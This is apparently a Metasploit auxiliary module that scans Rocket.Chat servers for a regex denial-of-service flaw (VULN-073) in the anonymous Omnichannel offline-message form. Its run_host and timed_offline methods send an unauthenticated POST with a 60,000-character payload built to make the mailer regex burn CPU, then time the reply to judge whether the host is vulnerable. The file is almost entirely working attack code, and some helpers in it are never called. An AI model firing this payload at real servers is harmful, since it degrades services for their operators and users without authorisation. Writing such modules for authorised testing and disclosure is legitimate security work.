class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat offline-form mailer ReDoS scanner (VULN-073)',
        'Description' => %q{
          Rocket.Chat is a self-hosted team chat server. The mailer placeholder regex
          remains quadratic after the CVE-2021-32832 fix, and the anonymous
          Omnichannel offline form (livechat/offline.message) feeds it unbounded
          visitor text before any recipient check, so one request burns seconds of
          CPU. This scanner submits an offline message with an MSGLEN-character
          payload and times it; a host is vulnerable when the request exceeds
          THRESHOLD seconds. No authentication is used.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2021-32832'],
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/api/v1/livechat/offline.message']),
      OptString.new('MSGLEN', [true, 'Length of the ReDoS payload fed to the mailer placeholder regex', '60000']),
      OptString.new('THRESHOLD', [true, 'Seconds above which the host is judged vulnerable', '2.0']),
      OptString.new('VISITOREMAIL', [true, 'The visitor email the offline form carries', 'visitor@example.org'])
    ])
  end

  def run_host(ip)
    res = timed_offline(datastore['MSGLEN'].to_i)
    unless res
      vprint_error("#{peer} - No response")
      return
    end

    hit = @elapsed > datastore['THRESHOLD'].to_f
    unless hit
      vprint_status("#{peer} - Not vulnerable to VULN-073")
      return
    end

    print_good("#{peer} - Vulnerable: VULN-073")
    report_vuln(
      host: ip,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-073 confirmed by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end

  def timed_offline(len)
    body = { 'name' => 'Visitor', 'email' => datastore['VISITOREMAIL'],
             'message' => '{' + ('a' * len), 'host' => 'https://example.org' }
    t0 = Time.now
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path),
      'ctype' => 'application/json',
      'data' => body.to_json
    }, 120)
    @elapsed = Time.now - t0
    res
  end
end
